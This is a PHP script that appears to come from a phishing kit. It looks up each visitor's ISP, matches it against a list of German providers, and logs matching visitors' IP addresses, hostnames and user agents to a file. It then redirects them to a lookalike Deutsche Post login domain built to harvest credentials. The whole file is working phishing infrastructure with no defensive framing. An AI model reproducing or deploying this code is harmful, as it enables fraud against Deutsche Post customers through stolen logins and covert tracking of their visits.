









<?php

date_default_timezone_set('Europe/Paris');
$current_date = date("y/m/d : H:i:s", time());
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
$isp = $query['isp'];
$org = $query['org'];
$isporg = $isp." ".$org;


$de = array(); 
$de[] = "1&1";
$de[] = "Antec";
$de[] = "congstar";
$de[] = "Deutsche";
$de[] = "DOKOM21";
$de[] = "easybell";
$de[] = "EWE";
$de[] = "EWE-Tel";
$de[] = "EWR";
$de[] = "Fietel";
$de[] = "Filiago";
$de[] = "fonial";
$de[] = "Htp";
$de[] = "NetCologne";
$de[] = "PŸUR";
$de[] = "PYUR";
$de[] = "Unitymedia";
$de[] = "Vodafone";
$de[] = "wilhelm";
$de[] = "Arcor";
$de[] = "Claranet";
$de[] = "Deutsche";
$de[] = "Freenet";
$de[] = "HanseNet";
$de[] = "m-net";
$de[] = "o2";
$de[] = "O2";
$de[] = "QSC";
$de[] = "Strato";
$de[] = "Tele";
$de[] = "Telefónica";
$de[] = "Telefonica";
$de[] = "Tiscali";
$de[] = "TKS";
$de[] = "T-Online";
$de[] = "United";
$de[] = "GTT";
$de[] = "SWN";
$de[] = "BetCologne";
$de[] = "Wilhelm";
$de[] = "M247";


foreach($de as $value)
{
	if(stripos($isporg,$value) !== false)
	{
		$agent = $_SERVER['HTTP_USER_AGENT'];
		$entry_line = "TRUE | TIME : $current_date | IP : $ip | ISP : $isp  | HN : $hostname | UA: $agent \r\n";
		$fp = fopen("ip.log", "a");
		fputs($fp, $entry_line);
		fclose($fp);
		header('Location: https://deutschepost-de-login.pearlapartments.com.ng/dpost/cookies/');
		exit();
	}
}




?>


